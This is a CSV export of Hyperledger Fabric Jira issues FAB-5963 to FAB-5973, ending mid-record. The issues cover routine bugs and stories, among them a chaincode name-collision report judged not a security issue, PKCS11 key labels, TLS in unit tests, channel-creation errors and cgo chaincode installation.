-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"05/Sep/17 11:07 PM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/13059/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missed checking the chaincode name when do install/instantiate,FAB-5963,20517,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,dhuseby,dhuseby,30/Aug/17 3:58 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/May/18 7:16 PM,v1.0.1,,,v1.2.0,,fabric-peer,,,,,29/Sep/17 12:00 AM,0,chaincode,,,,,,"Hi, security experts,

Not sure the following is a security bug, but I believe it may produce an attack on the peer nodes system, and affect other users.

Currently, we do not check the user chaincode's name when do install/instantiate.

This may result in potential mistakes by using same name of system chaincode.

When doing further user chaincode invoke, peer may believe it's a call to system chaincode (by simply checking its name in the system chaincode list), and will lead to uncontrolable privilege leakage.

If this is thought not a security bug, then I will create an open jira task and fix it.

Please help advice.

Thanks!",,baohua,denyeart,dhuseby,harrisob@us.ibm.com,jwagantall,jyellick,mastersingh24,muralisr,simsc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyes7:",,,,,,,,,,,,,,,,,,,,,,,baohua,denyeart,dhuseby,harrisob@us.ibm.com,jwagantall,jyellick,mastersingh24,muralisr,simsc,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Aug/17 4:00 AM;dhuseby;Be sure to email Baohua Yang <yangbaohua@gmail.com> when we have a resolution.;;;","06/Sep/17 1:14 AM;dhuseby;[~mastersingh24] or [~ChristopherFerris] or [~JonathanLevi] who is going to take a look at this bug and triage it?  Should we call a meeting?;;;","19/Sep/17 5:03 AM;dhuseby;ping;;;","04/Oct/17 4:56 AM;jwagantall;test comment;;;","16/Oct/17 10:14 PM;simsc;David - in your email you mentioned that this was recently assigned.   Who was this assigned to and I will follow up.  ;;;","16/Oct/17 11:43 PM;muralisr;Install will allow one to install a chaincode with the same name as a system chaincode but instantiation of that chaincode will not work.

 install example02 with name lscc
{code:java}
CORE_PEER_ADDRESS=192.168.1.97:7051 peer chaincode install -n lscc -p github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02 -v 0
{code}

Instantiate above lscc will fail with error
{code:java}
CORE_PEER_ADDRESS=192.168.1.97:7051 peer chaincode instantiate -n lscc -v 0 -C myc -c '{""Args"":[""init"",""a"",""100"",""b"",""200""]}'

Error: Error endorsing chaincode: rpc error: code = Unknown desc = attempting to deploy a system chaincode lscc/myc
{code}

In other words, though one can install a chaincode with the same name as a system chaincode, it cannot not be instantiated - its just ""dead"" code.

So the statement
_Currently, we do not check the user chaincode's name when do install/-instantiate-._
 is not totally accurate (strikethru instantiate).

Its not a severe security issue (unless I'm missing something in the above analysis).... however, it _would_ be nice to check for name collision with system chaincodes and prevent install.
 ;;;","20/Oct/17 10:59 PM;simsc;Pasting in a Rocket Chat thread from Elli
 * elli-androulaki 11:01 AM
hi
 * 
I transferred the message to Angelo Ale, and Mathias and we are looking into potential problems for this one.
 * 
 elli-androulaki 11:29 AM
Ok, so it seems there is no security breach because of this, but we need to prevent cc-s installation/instantiation with same names as scc-s it to avoid confusion. 
The only potential problem Angelo and I detected while looking into this is that RSCC invocation has not completed. Essentially one can change RSCC state without being authorised to do so. This is something that Angelo will take care of.
 * 
This does not impact v1, but only v1.1-alpha;;;","01/Nov/17 2:34 AM;mastersingh24;I'm changing the security level as this is not a security issue with the current release;;;","20/Nov/17 3:22 PM;baohua;@[~simsc], agree, and let's at least prevent user install user-cc with names as a system-cc.

Thanks!;;;","27/Nov/17 11:21 AM;denyeart;Assigning to [~adc] per the comments.;;;","08/Jan/18 11:45 AM;denyeart;[~adc] I will tag this one as v1.1, I don't think it is must fix for v1.1.0-alpha.  Also note that RSCC may get removed from v1.1 per https://gerrit.hyperledger.org/r/#/c/16037/.  If that is the case, what needs to be done for this one?;;;","27/Jan/18 9:17 PM;mastersingh24;moved to 1.2;;;","10/Feb/18 12:52 AM;harrisob@us.ibm.com;This is not a problem with the actual node chaincode. This is an issue with the fabric side peer that does the install.;;;","05/May/18 12:00 AM;jyellick;In review via: https://gerrit.hyperledger.org/r/21425;;;",,,,,,,,,,,,,,,,,,,,,,,,,
BCCSP PKCS11 CKA_LABEL should be unique,FAB-5964,20518,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jpatchell,jpatchell,jpatchell,30/Aug/17 6:26 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,17/Oct/17 7:26 AM,,,,v1.0.4,v1.1.0,fabric-crypto,,,,,,1,,,,,,,"Currently the BCCSP PKCS11 implementation sets the CKA_LABEL of the public and private keys to something like BCPUB1 and PCPRV1 respectively and sets the CKA_ID to the SKI bytes of the key pair.  For an HSM partition, this means that the CKA_LABEL will be the same if there are many key pairs in the same partition.  This makes it impossible to search for a key by the CKA_LABEL which is a common attribute to use for searching as the attribute will not be unique.  

The CKA_LABEL should be set to the hex string of the SKI to make it unique for searching.

NOTE:  The SKI is a good choice as it can easily be calculated from the public key bytes of the MSP certificate which allows searching for the key by an alias (CKA_LABEL) given a certificate from an MSP that has the private key in a HSM.",,jpatchell,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyesf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jpatchell,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Sep/17 12:08 AM;Clayton Sims;https://gerrit.hyperledger.org/r/#/c/13019/;;;","15/Oct/17 8:47 PM;mastersingh24;Changing to in progress as this actually needs to be backported to v1.0.x and re-vendored for fabric-ca for both v1.0.x and 1.1;;;","17/Oct/17 7:38 AM;mastersingh24;https://gerrit.hyperledger.org/r/14527;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode unit test fails due to missing TLS Certificate,FAB-5965,20520,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,Senthil1,Senthil1,30/Aug/17 1:11 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,26/Oct/17 3:01 AM,,,,,,fabric-peer,,,,,,0,chaincode,,,,,,"Due to -FAB-5406-] Mutual TLS in chaincode service-P3, exectransaction_test.go fails with the following errors.

`2017-08-30 09:24:33.085 IST [accessControl] authenticate -> WARN 019 TLS is active but chaincode tmap:0 didn't send certificate` 
 launchAndWaitForRegister failed Timeout expired while starting chaincode tmap:0(networkid:dev,peerid:jdoe,tx:75c6ffaf-2d81-4fbb-9a52-e3e27d473f26)
 Error initializing chaincode tmap(Error deploying chaincode(2): Timeout expired while starting chaincode tmap:0(networkid:dev,peerid:jdoe,tx:75c6ffaf-2d81-4fbb-9a52-e3e27d473f26))

To reproduce above errors, enable TestQueries() unit test in exectransaction_test.go by commenting out testForSkip(t) ([https://github.com/hyperledger/fabric/blob/master/core/chaincode/exectransaction_test.go#L1075|https://github.com/hyperledger/fabric/blob/master/core/chaincode/exectransaction_test.go#L1075)])

After commenting out error in access.go ([https://github.com/hyperledger/fabric/blob/master/core/chaincode/accesscontrol/access.go#L104|https://github.com/hyperledger/fabric/blob/master/core/chaincode/accesscontrol/access.go#L104),] ), unit-test ran successfully. 

Looks like exectransaction_test.go needs to be changed but not sure what the changes should be. We need TestQueries() for end to end testing which cannot be done by chaincode_support_test.go. ",,denyeart,muralisr,Senthil1,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6761,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyesn:",,,,,,,,,,,,,,,,,,,,,,,denyeart,muralisr,Senthil1,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/17 1:12 PM;Senthil1;[~denyeart];;;","30/Aug/17 4:51 PM;yacovm;Yes, I added TLS mutual authentication for chaincode shim, but I don't see how it follows from here that I should be assigned to this JIRA item that re-introduces a test that has been disabled for ages?
Also - why is this a HIGH priority bug? It doesn't affect production. ;;;","30/Aug/17 9:13 PM;Senthil1;exectransaction_test.go was disabled as it was taking significant time. We have been using this unit test internally to perform e2e test of Chaincode APIs. It was working fine till FAB-5406 got merged. ;;;","30/Aug/17 10:40 PM;yacovm;{quote}We have been using this unit test internally to perform e2e test of Chaincode APIs.{quote}

Who is we? I have no knowledge of this test being used anywhere.;;;","30/Aug/17 10:52 PM;Senthil1;'We' refers to ledger team. We run this test manually by explicitly enabling TestQueries() in exectransaction_test.go and run the test from fabric/core/chaincode using `$ go test -ldflags ""-X github.com/hyperledger/fabric/common/metadata.Version=1.1.0-snapshot-238e155 -X github.com/hyperledger/fabric/common/metadata.BaseVersion=0.3.2 -X github.com/hyperledger/fabric/common/metadata.BaseDockerLabel=org.hyperledger.fabric -X github.com/hyperledger/fabric/common/metadata.DockerNamespace=hyperledger -X github.com/hyperledger/fabric/common/metadata.BaseDockerNamespace=hyperledger"" -run Queries`

`make test-cmd` provides the above go test flags. CI does not run any unit test in exectransaction_test.go.

Anyway, we are enabling TestQueries() in CI mainly to avoid future problems. [https://gerrit.hyperledger.org/r/#/c/12257/] fails because of missing TLS certificate. Temporarily, I can fix this error by setting tls to false in initPeer() as it will not affect query API testing. ;;;","08/Sep/17 2:37 AM;muralisr;Need to investigate what needs to be done to disable TLS for this UT that is needed for Side DB.;;;","08/Sep/17 2:37 AM;denyeart;exectransation is re-enabled in: [https://gerrit.hyperledger.org/r/#/c/12257/18/core/chaincode/exectransaction_test.go] , but with viper.Set(""peer.tls.enabled"", false).

This work item will make exectransation work with TLS.;;;","26/Oct/17 1:00 AM;muralisr;[~denyeart] exectransaction_test.go was retired so was not kept up-to-date with other changes such as TLS. Is the work around to disable TLS you mention sufficient to close this bug ?;;;","26/Oct/17 1:26 AM;denyeart;[~muralisr] exectransaction_test.go was brought out of retirement to help test queries.  As far as I am concerned, it is serving our purpose without TLS enabled.  If there is TLS coverage elsewhere, then I agree you can close this one.;;;","26/Oct/17 1:58 AM;muralisr;[~denyeart] There is some ... in particular that touch various aspects of TLS support in the chaincode
https://gerrit.hyperledger.org/r/#/c/13451/
https://gerrit.hyperledger.org/r/#/c/11913/

While there's nothing that actually tests peer-CC TLS communication, vote we open a separate JIRA to implement that on the new chaincode test framework (given exectransaction_test.go was retired) and close this JIRA ?;;;","26/Oct/17 2:40 AM;denyeart;[~muralisr] Agreed - go ahead and close this defect and open a new feature/task for peer-CC TLS communication test on the new chaincode test framework.  (I'd do it, but I'm sure you'll word it better than me!);;;","26/Oct/17 2:52 AM;denyeart;[~muralisr] Yacov mentioned that TLS is tested during e2e CI already, so probably ok not to have a separate unit test.;;;","26/Oct/17 3:01 AM;muralisr;[~denyeart] Absolutely.  created/linked https://jira.hyperledger.org/browse/FAB-6761. I made it an improvement and not a bug as there were already tests... but if I can see it as a bug too. Feel free to change it bug if that's a better characterization.;;;","26/Oct/17 3:04 AM;muralisr;[~denyeart] Our comments crossed... as I opneed it as an improvement, perhaps let it be there. It will be a good one for someone to pick and contribute (and I can help).;;;",,,,,,,,,,,,,,,,,,,,,,,,,
Balance Transfer sample application using Fabric Java SDK,FAB-5966,20521,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,SwatiRaj,SwatiRaj,SwatiRaj,30/Aug/17 1:49 PM,23/Jan/20 7:04 AM,28/Oct/23 3:00 AM,23/Jan/20 7:04 AM,v1.0.0,,,,,fabric-samples,,,,,,0,java-SDK,Release-planning-1.2,stale-item,,,,"A *balance transfer* spring boot application using +fabric SDK java+ which will demonstrates all the basic _functionalities_ of *hyperledger 1.0*, such as enrolling and registering user , creating channel , installing chaincode , instantiating chaincode , invoking chaincode and querying chaincode. I have created this sample application for reference so that people who want to develop a hyperledger fabric solution using Java SDK can use the sample to accelerate their application development.",,PuneetJoshi,sgdev,sharad.develop,SwatiRaj,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,";30/Aug/17 1:57 PM;SwatiRaj;86400",";04/Sep/17 3:19 PM;SwatiRaj;144000",144000,0,230400,160%,144000,0,230400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyesv:",,,,Unset,,12,,,,,5.0,Unset,,,,,,,,,,,PuneetJoshi,sgdev,sharad.develop,SwatiRaj,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:04 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
the dev dir sampleconfig doesn't provide the tls config,FAB-5967,20522,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,asaningmaxchain,asaningmaxchain,30/Aug/17 2:04 PM,23/Jan/20 7:04 AM,28/Oct/23 3:00 AM,23/Jan/20 7:04 AM,,,,,,fabric-orderer,,,,,,0,stale-item,,,,,,"in the dev mode,the fabric-orderer module doesn't provide the tls config thought the orderer enable the tls feature",,asaningmaxchain,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyet3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,asaningmaxchain,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:04 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replace license header for msp/msp_test.go,FAB-5968,20523,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,luomin,luomin,30/Aug/17 2:19 PM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,11/Oct/17 11:02 AM,,,,,,fabric-build,,,,,,0,,,,,,,"msp/msp_test.go has the HEAD as

 

/*
Copyright IBM Corp. 2017 All Rights Reserved.


Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

                 http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

 

We need to replace it to the new SPDX license to pass

""make checks"".

Otherwise, there is the error as below.

---------------------------------------

Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
msp/msp_test.go

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1

---------------------------------------

 ",,luomin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyetb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,luomin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Block ingress TX when a config TX is resubmitted due to lagged config seq until all in-flight config TXs are committed.,FAB-5969,20524,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,guoger,guoger,guoger,30/Aug/17 3:23 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,24/Nov/17 4:06 AM,,,,Future,,fabric-orderer,,,,,,0,,,,,,,"A valid configure message {{TX ~config~}} will advance {{ConfigSeq}} when committed. In this case, while a {{TX ~config~}} is in flight, all messages received between *receipt* and *commit* of {{TX ~config~}} *need to be re-validated*. In the case of Kafka-base OSN, this introduces *overhead of re-submitting those messages to Kafka* (see FAB-5720 for the reason).

A simple, yet native solution is to block ingress TXs when a {{TX ~config~}} is received until that TX is eventually committed. However, there's no mechanism to synchronously block all orderers when only one of them receives a {{TX ~config~}}.

Instead, we block if consecutive {{TX ~config~}} are in-flight and the commitment of *first one* causes all following ones to be re-validated and re-submitted.

So we don't necessarily eliminate all the potential overhead, but hopefully most of it.",,guoger,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5720,FAB-5258,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyetj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,guoger,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Sep/17 5:15 PM;guoger;Locking schema:
- define WaitGroup {{reprocessedMsgInFlight}} (better name?) as part of {{chainImpl}}
- for every message with stale {{ConfigSeq}}, *increment {{reprocessedMsgInFlight}} by 1*
- for every message with {{OriginalOffset != 0 && OriginalOffset > chain.lastOriginalOffsetProcessed}}, *decrement {{reprocessedMsgInFlight}} by 1*
- {{Order}} and {{Configure}} should wait for {{reprocessedMsgInFlight}}

Here's a draft CR: https://gerrit.hyperledger.org/r/c/13963/
[~kchristidis] [~jyellick] [~sanchezl] what do you think.;;;","12/Oct/17 6:45 PM;guoger;Review: https://gerrit.hyperledger.org/r/c/13963/;;;","27/Oct/17 12:47 PM;kchristidis;The Description is different to the solution proposed in the CR, right?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Channel Creation Error:  Rejecting CONFIG_UPDATE because: Error authorizing update: Error validating DeltaSet: invalid mod_policy for element [Policy] /Channel/Application/Admins: mod_policy not set,FAB-5970,20525,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,jyellick,sajeevkhan,sajeevkhan,30/Aug/17 8:45 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,26/Oct/17 1:14 AM,,,,WON'T FIX,,fabric-tools,,,,,,0,configuration,,,,,,"Hi,  

We are using configtxgen version 1.0.1 to generate the channel.tx file. On trying to create a channel, we get the following error message: 

As per my assessment, it seems to be an error caused during channel.tx file creation. It would be great if you someone can provide a resolution for this. 

 

 

orderer.example.com       | 2017-08-30 04:30:02.689 UTC [common/configtx] addToMap -> DEBU 1a3 Adding to config map: [Policy] /Channel/Application/Admins

orderer.example.com       | 2017-08-30 04:30:02.689 UTC [common/configtx] addToMap -> DEBU 1a4 Adding to config map: [Policy] /Channel/Application/Writers

orderer.example.com       | 2017-08-30 04:30:02.689 UTC [common/configtx] addToMap -> DEBU 1a5 Adding to config map: [Policy] /Channel/Application/Readers

orderer.example.com       | 2017-08-30 04:30:02.689 UTC [common/configtx] addToMap -> DEBU 1a6 Adding to co{color:#ff0000}nfig map: [Values] /Channel/Consortium{color}

{color:#ff0000}orderer.example.com       *| 2017-08-30 04:30:02.690 UTC [orderer/common/broadcast] Handle -> WARN 1a7 Rejecting CONFIG_UPDATE because: Error authorizing update: Error validating DeltaSet: invalid mod_policy for element [Policy] /Channel/Application/Writers: mod_policy not set*{color}

orderer.example.com       | 2017-08-30 04:30:02.691 UTC [orderer/main] func1 -> DEBU 1a8 Closing Broadcast stream

 

 

Regards

Sajeev

 H",,jyellick,kchristidis,mastersingh24,sajeevkhan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Sep/17 4:33 PM;sajeevkhan;foo.json;https://jira.hyperledger.org/secure/attachment/12019/foo.json","04/Sep/17 4:33 PM;sajeevkhan;orderer.json;https://jira.hyperledger.org/secure/attachment/12020/orderer.json",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyetr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,kchristidis,mastersingh24,sajeevkhan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Sep/17 9:25 PM;mastersingh24;[~sajeevkhan] Are you sure you are using configtxgen 1.0.1 and/or are you sure that the updated artifact(s) is(are) being used?
I believe that we see this error when using configtxgen v1.0.0 to create new channels with Fabric v1.0.1+;;;","04/Sep/17 4:16 PM;sajeevkhan;Hi [~mastersingh24]

Our cryptogen and configtxgen version is 1.0.1 and our Go Version is go1.7  We first encountered this issue on Fabric 1.0.1. After this we upgraded to Fabric 1.0.2. and met with same issue. 

On doing an inspection of the channel.tx and orderer.block we could see ModPolicy defined. 
Attached are the ispection results of the channel and orderer block binary results.

Regards,Sajeev ;;;","08/Sep/17 2:18 AM;kchristidis;Double-checked with [~jyellick] who's written the code for this to make sure I'm not missing anything.

JSON looks good, are you sure you're submitting the right channel.tx file and not an old one? This error message only comes up if the mod policy is empty, which is not the case for the JSON file you've attached here.;;;","08/Sep/17 6:30 PM;sajeevkhan;Hi [~kchristidis],

I have doubvle confirmed that the it is the correct channel.tx file and the configtxgen version is 1.0.2 on a network which runs on fabric 1.0.2 ;;;","18/Oct/17 1:45 AM;kchristidis;Sajeev, I hear you when you say you've double-checked this but I'm unable to reproduce this issue.

There is only one place in the codebase that can trigger this and the path that takes us there looks pretty deterministic to me:

[https://github.com/hyperledger/fabric/blob/release/common/configtx/update.go#L85|https://github.com/hyperledger/fabric/blob/release/common/configtx/update.go#L60]

[https://github.com/hyperledger/fabric/blob/release/common/configtx/update.go#L60]

[~jyellick], I vote that we close. If the issue persists from Sajeev's side, is there are anything else that he can provide to help with debugging?

 

 ;;;","18/Oct/17 1:49 AM;jyellick;If this issue is reproducible, then having the {{configtx.yaml}}, the profile name which was used to bootstrap the ordering system channel, the profile name which was used to create the application channel, and the transaction which is being submitted to create the channel.;;;","18/Oct/17 1:52 AM;kchristidis;I'll keep this open for a week, then close if there are no updates.;;;","26/Oct/17 1:15 AM;jyellick;Since there have been no updates and this cannot be reproduced, closing for now until the reporter provides more details.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add private data pull support to gossip,FAB-5971,20526,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,30/Aug/17 8:47 PM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,16/Oct/17 6:26 AM,,,,v1.1.0,,fabric-gossip,,,,,,0,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5088,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzyetz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unable to install go chaincode that uses C,FAB-5972,20527,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,ftgha,ftgha,30/Aug/17 11:08 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,17/Sep/17 2:14 AM,v1.0.2,,,v1.1.0,,fabric-peer,,,,,,0,Golang,peer,,,,,"Hello, I'm trying to write chaincode that calls C code and am failing to get peers to install it. I'm using the chaincode-docker-devmode environment and after running

{code:none} peer chaincode install -p chaincodedev/chaincode/chaincode_example02 -n mycc -v 0
{code}

get the following error: 
{code:none} 
2017-08-30 13:56:48.844 UTC [golang-platform] getCodeFromFS -> DEBU 005 getCodeFromFS chaincodedev/chaincode/chaincode_example02
2017-08-30 13:56:49.061 UTC [golang-platform] func1 -> DEBU 006 Accepting import: C
2017-08-30 13:56:49.061 UTC [golang-platform] func1 -> DEBU 007 Discarding GOROOT package fmt
2017-08-30 13:56:49.061 UTC [golang-platform] func1 -> DEBU 008 Discarding provided package github.com/hyperledger/fabric/core/chaincode/shim
2017-08-30 13:56:49.061 UTC [golang-platform] func1 -> DEBU 009 Discarding provided package github.com/hyperledger/fabric/protos/peer
2017-08-30 13:56:49.062 UTC [golang-platform] func1 -> DEBU 00a Discarding GOROOT package strconv
Error: Error getting chaincode code chaincode: Error getting chaincode package bytes: Error obtaining dependencies for C: <go, [list -f {{ join .Deps ""\n""}} C]>: failed with error: ""exit status 1""
can't load package: package C: cannot find package ""C"" in any of:
        /opt/go/src/C (from $GOROOT)
        /opt/gopath/src/C (from $GOPATH)
{code} 
All I did was to include this small snippet of C in the chaincode_example02: 

{code:none}
/*
#include <stdio.h>

void foo() {
	printf(""Hello, World!\n"");
}
*/
import ""C""
{code} ",,ftgha,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeu7:",,,,,,,,,,,,,,,,,,,,,,,ftgha,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Sep/17 4:46 AM;muralisr;[~ftgha] Did you try vendoring to get over this problem ?;;;","08/Sep/17 5:00 AM;ftgha;""C"" is a pseudo package. I'm almost certain that it cannot be vendored, but please correct me if I am wrong.
My intuition would be that it can be skipped safely if peers come with a full go installation but I don't know enough about the internals of fabric.;;;","16/Sep/17 9:02 PM;mastersingh24;https://gerrit.hyperledger.org/r/13545;;;","16/Sep/17 9:22 PM;muralisr;[~ftgha] you are right (wish I can take back the thoughtless comment :-) )... (thanks [~mastersingh24] );;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CouchDB - documents deleted in multiple batches cause an error,FAB-5973,20528,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,chris.elder,chris.elder,chris.elder,30/Aug/17 11:35 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 5:44 AM,,,,,,,,,,,,0,,,,,,,"CouchDB will throw an error if a document is deleted in more than one update batch.  The first batch actually deletes the document, but if the delete is included in a subsequent batch an exception will be thrown since the document revision will not be resolved correctly.   In this case, the batch update should ignore documents that are already deleted.   Update documents are not impacted since the update operation can correctly resolve the CouchDB revision info.",,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeuf:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Oct/17 5:44 